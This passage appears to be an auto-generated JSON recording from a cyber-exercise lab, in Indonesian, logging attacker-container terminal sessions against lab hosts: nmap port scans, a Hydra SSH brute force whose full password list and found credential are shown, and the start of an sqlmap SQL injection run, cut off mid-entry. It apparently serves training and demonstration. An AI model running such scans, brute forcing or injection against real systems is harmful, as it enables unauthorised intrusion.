@@ -1,0 +1,3465 @@
+{
+ "versi": 1,
+ "catatan": "Semua isi berkas ini dihasilkan otomatis oleh video/rekam/rekam.cjs dari lab yang berjalan. Waktu dalam epoch milidetik (t) kecuali disebut lain.",
+ "mulai": 1794105713708,
+ "selesai": 1794106238074,
+ "git": "5750477",
+ "video": {
+  "analis": {
+   "berkas": "rekaman/analis-desktop.webm",
+   "akun": "analis@sentra.lab",
+   "viewport": [
+    1920,
+    1080
+   ],
+   "mulai": 1794105713835,
+   "selesai": 1794106235449
+  },
+  "komandan": {
+   "berkas": "rekaman/komandan-hp.webm",
+   "akun": "komandan@sentra.lab",
+   "viewport": [
+    390,
+    844
+   ],
+   "perangkat": "iPhone 13 (emulasi Playwright, viewport 390x844)",
+   "mulai": 1794105713875,
+   "selesai": 1794106235449
+  }
+ },
+ "terminal": [
+  {
+   "id": "nmap-kodim-a",
+   "judul": "Pengintaian: pindai port Kodim A",
+   "container": "attacker",
+   "perintah": "./skenario/01-pindai.sh 172.30.0.11",
+   "mulai": 1794105733694,
+   "selesai": 1794105734571,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105733887,
+     "teks": "Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-08 02:42 UTC"
+    },
+    {
+     "t": 1794105734518,
+     "teks": "Nmap scan report for 172.30.0.11"
+    },
+    {
+     "t": 1794105734518,
+     "teks": "Host is up (0.0000060s latency)."
+    },
+    {
+     "t": 1794105734518,
+     "teks": "Not shown: 998 closed tcp ports (reset)"
+    },
+    {
+     "t": 1794105734518,
+     "teks": "PORT   STATE SERVICE"
+    },
+    {
+     "t": 1794105734518,
+     "teks": "22/tcp open  ssh"
+    },
+    {
+     "t": 1794105734518,
+     "teks": "80/tcp open  http"
+    },
+    {
+     "t": 1794105734518,
+     "teks": "MAC Address: DE:F3:AC:CF:24:A7 (Unknown)"
+    },
+    {
+     "t": 1794105734518,
+     "teks": ""
+    },
+    {
+     "t": 1794105734518,
+     "teks": "Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds"
+    }
+   ]
+  },
+  {
+   "id": "hydra-kodim-a",
+   "judul": "Akses awal: brute force SSH Kodim A",
+   "container": "attacker",
+   "perintah": "./skenario/02-bruteforce-ssh.sh 172.30.0.11",
+   "mulai": 1794105797565,
+   "selesai": 1794105888551,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105799582,
+     "teks": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)."
+    },
+    {
+     "t": 1794105799583,
+     "teks": ""
+    },
+    {
+     "t": 1794105799583,
+     "teks": "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-08 02:43:19"
+    },
+    {
+     "t": 1794105799590,
+     "teks": "[DATA] max 4 tasks per 1 server, overall 4 tasks, 128 login tries (l:8/p:16), ~32 tries per task"
+    },
+    {
+     "t": 1794105799590,
+     "teks": "[DATA] attacking ssh://172.30.0.11:22/"
+    },
+    {
+     "t": 1794105799869,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"123456\" - 1 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105799869,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"password\" - 2 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105799869,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"admin\" - 3 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105799869,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"12345678\" - 4 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105802287,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"qwerty\" - 5 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105802297,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"rahasia\" - 6 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105802297,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"toor\" - 7 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105802312,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"letmein\" - 8 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105804650,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"welcome\" - 9 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105804661,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"admin123\" - 10 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105804661,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"passw0rd\" - 11 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105804671,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"indonesia\" - 12 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105807007,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"merdeka\" - 13 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105807017,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"kodim2026\" - 14 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105807027,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"latihan\" - 15 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105807038,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"root\" - pass \"latihan123\" - 16 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105809369,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"123456\" - 17 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105809380,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"password\" - 18 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105809391,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"admin\" - 19 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105809401,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"12345678\" - 20 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105812654,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"qwerty\" - 21 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105812670,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"rahasia\" - 22 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105812683,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"toor\" - 23 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105812691,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"letmein\" - 24 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105815877,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"welcome\" - 25 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105815891,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"admin123\" - 26 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105815903,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"passw0rd\" - 27 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105815913,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"indonesia\" - 28 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105819101,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"merdeka\" - 29 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105819112,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"kodim2026\" - 30 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105819129,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"latihan\" - 31 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105819140,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"admin\" - pass \"latihan123\" - 32 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105820711,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"123456\" - 33 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105820727,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"password\" - 34 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105820740,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"admin\" - 35 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105820751,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"12345678\" - 36 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105824525,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"qwerty\" - 37 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105824541,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"rahasia\" - 38 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105824553,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"toor\" - 39 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105824566,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"letmein\" - 40 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105828269,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"welcome\" - 41 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105828287,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"admin123\" - 42 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105828298,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"passw0rd\" - 43 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105828313,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"indonesia\" - 44 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105832013,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"merdeka\" - 45 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105832030,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"kodim2026\" - 46 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105832042,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"latihan\" - 47 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105832058,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"administrator\" - pass \"latihan123\" - 48 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105835761,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"123456\" - 49 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105835774,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"password\" - 50 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105835790,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"admin\" - 51 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105835809,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"12345678\" - 52 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105840347,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"qwerty\" - 53 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105840360,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"rahasia\" - 54 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105840378,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"toor\" - 55 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105840388,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"letmein\" - 56 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105842609,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"welcome\" - 57 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105842622,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"admin123\" - 58 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105842638,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"passw0rd\" - 59 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105842648,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"indonesia\" - 60 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105844869,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"merdeka\" - 61 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105844881,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"kodim2026\" - 62 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105844901,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"latihan\" - 63 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105844912,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"ubuntu\" - pass \"latihan123\" - 64 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105847133,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"123456\" - 65 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105847145,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"password\" - 66 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105847163,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"admin\" - 67 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105847173,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"12345678\" - 68 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105849883,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"qwerty\" - 69 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105849899,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"rahasia\" - 70 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105849909,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"toor\" - 71 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105849922,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"letmein\" - 72 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105852576,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"welcome\" - 73 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105852593,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"admin123\" - 74 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105852604,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"passw0rd\" - 75 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105852615,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"indonesia\" - 76 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105855272,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"merdeka\" - 77 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105855285,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"kodim2026\" - 78 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105855298,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"latihan\" - 79 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105855308,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"operator\" - pass \"latihan123\" - 80 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105857963,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"123456\" - 81 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105857989,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"password\" - 82 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105858014,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"admin\" - 83 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105858020,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"12345678\" - 84 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105859071,
+     "teks": "[STATUS] 84.00 tries/min, 84 tries in 00:01h, 44 to do in 00:01h, 4 active"
+    },
+    {
+     "t": 1794105862477,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"qwerty\" - 85 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105862522,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"rahasia\" - 86 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105862522,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"toor\" - 87 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105862541,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"letmein\" - 88 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105864693,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"welcome\" - 89 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105864730,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"admin123\" - 90 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105864740,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"passw0rd\" - 91 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105864751,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"indonesia\" - 92 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105866912,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"merdeka\" - 93 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105866949,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"kodim2026\" - 94 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105866961,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"latihan\" - 95 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105866973,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"test\" - pass \"latihan123\" - 96 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105869145,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"123456\" - 97 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105869169,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"password\" - 98 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105869180,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"admin\" - 99 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105869203,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"12345678\" - 100 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105873499,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"qwerty\" - 101 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105873539,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"rahasia\" - 102 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105873550,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"toor\" - 103 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105873572,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"letmein\" - 104 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105875651,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"welcome\" - 105 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105875691,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"admin123\" - 106 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105875701,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"passw0rd\" - 107 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105875724,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"indonesia\" - 108 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105877806,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"merdeka\" - 109 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105877843,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"kodim2026\" - 110 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105877855,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"latihan\" - 111 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105877876,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"guest\" - pass \"latihan123\" - 112 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105879958,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"123456\" - 113 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105879997,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"password\" - 114 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105880009,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"admin\" - 115 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105880030,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"12345678\" - 116 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105883370,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"qwerty\" - 117 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105883412,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"rahasia\" - 118 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105883429,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"toor\" - 119 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105883449,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"letmein\" - 120 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105886723,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"welcome\" - 121 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105886778,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"admin123\" - 122 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105886813,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"passw0rd\" - 123 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105886813,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"indonesia\" - 124 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105888396,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"merdeka\" - 125 of 128 [child 2] (0/0)"
+    },
+    {
+     "t": 1794105888428,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"kodim2026\" - 126 of 128 [child 1] (0/0)"
+    },
+    {
+     "t": 1794105888469,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"latihan\" - 127 of 128 [child 3] (0/0)"
+    },
+    {
+     "t": 1794105888472,
+     "teks": "[ATTEMPT] target 172.30.0.11 - login \"latihan\" - pass \"latihan123\" - 128 of 128 [child 0] (0/0)"
+    },
+    {
+     "t": 1794105888527,
+     "teks": "[22][ssh] host: 172.30.0.11   login: latihan   password: latihan123"
+    },
+    {
+     "t": 1794105888527,
+     "teks": "[STATUS] attack finished for 172.30.0.11 (valid pair found)"
+    },
+    {
+     "t": 1794105888533,
+     "teks": "1 of 1 target successfully completed, 1 valid password found"
+    },
+    {
+     "t": 1794105888533,
+     "teks": "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-08 02:44:48"
+    }
+   ]
+  },
+  {
+   "id": "nmap-kodim-b",
+   "judul": "Pengintaian: pindai port Kodim B",
+   "container": "attacker",
+   "perintah": "./skenario/01-pindai.sh 172.30.0.12",
+   "mulai": 1794105891975,
+   "selesai": 1794105892476,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105892284,
+     "teks": "Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-08 02:44 UTC"
+    },
+    {
+     "t": 1794105892437,
+     "teks": "Nmap scan report for 172.30.0.12"
+    },
+    {
+     "t": 1794105892437,
+     "teks": "Host is up (0.0000060s latency)."
+    },
+    {
+     "t": 1794105892437,
+     "teks": "Not shown: 998 closed tcp ports (reset)"
+    },
+    {
+     "t": 1794105892437,
+     "teks": "PORT   STATE SERVICE"
+    },
+    {
+     "t": 1794105892437,
+     "teks": "22/tcp open  ssh"
+    },
+    {
+     "t": 1794105892437,
+     "teks": "80/tcp open  http"
+    },
+    {
+     "t": 1794105892437,
+     "teks": "MAC Address: 2E:21:2E:DA:64:E5 (Unknown)"
+    },
+    {
+     "t": 1794105892437,
+     "teks": ""
+    },
+    {
+     "t": 1794105892437,
+     "teks": "Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds"
+    }
+   ]
+  },
+  {
+   "id": "sqlmap-kodim-a",
+   "judul": "Akses awal: SQL injection portal Kodim A",
+   "container": "attacker",
+   "perintah": "./skenario/03-sqlmap.sh 172.30.0.11",
+   "mulai": 1794105927063,
+   "selesai": 1794105931470,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105930197,
+     "teks": "        ___"
+    },
+    {
+     "t": 1794105930197,
+     "teks": "       __H__"
+    },
+    {
+     "t": 1794105930197,
+     "teks": " ___ ___[.]_____ ___ ___  {1.8.4#stable}"
+    },
+    {
+     "t": 1794105930197,
+     "teks": "|_ -| . [(]     | .'| . |"
+    },
+    {
+     "t": 1794105930197,
+     "teks": "|___|_  [,]_|_|_|__,|  _|"
+    },
+    {
+     "t": 1794105930197,
+     "teks": "      |_|V...       |_|   https://sqlmap.org"
+    },
+    {
+     "t": 1794105930197,
+     "teks": ""
+    },
+    {
+     "t": 1794105930276,
+     "teks": "[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program"
+    },
+    {
+     "t": 1794105930276,
+     "teks": ""
+    },
+    {
+     "t": 1794105930276,
+     "teks": "[*] starting @ 02:45:30 /2026-11-08/"
+    },
+    {
+     "t": 1794105930276,
+     "teks": ""
+    },
+    {
+     "t": 1794105930761,
+     "teks": "[1/1] URL:"
+    },
+    {
+     "t": 1794105930761,
+     "teks": "GET http://172.30.0.11/berita.php?id=1"
+    },
+    {
+     "t": 1794105930761,
+     "teks": "do you want to test this URL? [Y/n/q]"
+    },
+    {
+     "t": 1794105930761,
+     "teks": "> Y"
+    },
+    {
+     "t": 1794105930761,
+     "teks": "[02:45:30] [INFO] testing URL 'http://172.30.0.11/berita.php?id=1'"
+    },
+    {
+     "t": 1794105930761,
+     "teks": "[02:45:30] [INFO] using '/root/.local/share/sqlmap/output/results-11082026_0245am.csv' as the CSV results file in multiple targets mode"
+    },
+    {
+     "t": 1794105930763,
+     "teks": "[02:45:30] [INFO] testing connection to the target URL"
+    },
+    {
+     "t": 1794105930785,
+     "teks": "[02:45:30] [INFO] checking if the target is protected by some kind of WAF/IPS"
+    },
+    {
+     "t": 1794105930796,
+     "teks": "[02:45:30] [INFO] testing if the target URL content is stable"
+    },
+    {
+     "t": 1794105931267,
+     "teks": "[02:45:31] [INFO] target URL content is stable"
+    },
+    {
+     "t": 1794105931267,
+     "teks": "[02:45:31] [INFO] testing if GET parameter 'id' is dynamic"
+    },
+    {
+     "t": 1794105931288,
+     "teks": "[02:45:31] [INFO] GET parameter 'id' appears to be dynamic"
+    },
+    {
+     "t": 1794105931305,
+     "teks": "[02:45:31] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable"
+    },
+    {
+     "t": 1794105931314,
+     "teks": "[02:45:31] [INFO] testing for SQL injection on GET parameter 'id'"
+    },
+    {
+     "t": 1794105931344,
+     "teks": "[02:45:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'"
+    },
+    {
+     "t": 1794105931361,
